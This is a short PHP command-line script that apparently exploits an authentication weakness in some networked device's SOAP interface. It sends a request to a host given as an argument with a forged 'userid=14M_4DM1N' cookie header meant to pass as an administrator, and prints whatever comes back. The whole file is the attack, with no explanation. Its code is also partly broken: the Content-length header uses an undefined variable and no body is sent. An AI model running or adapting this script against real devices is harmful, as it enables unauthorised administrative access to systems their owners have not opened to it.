<?php
error_reporting(0);
set_time_limit(0);

$host = $_SERVER['argv'][1];
if(!empty($host)){
	$tuCurl = curl_init();
	curl_setopt($tuCurl, CURLOPT_HTTPHEADER, array("Content-Type: text/xml","SOAPAction: \"/soap/action/query\"", "Content-length: ".strlen($data), "Set-Cookie: userid=14M_4DM1N"));
	curl_setopt($tuCurl, CURLOPT_URL, $host);
	$tuData = curl_exec($tuCurl);
	echo $tuData;
	curl_close($tuCurl);
	
}
?>
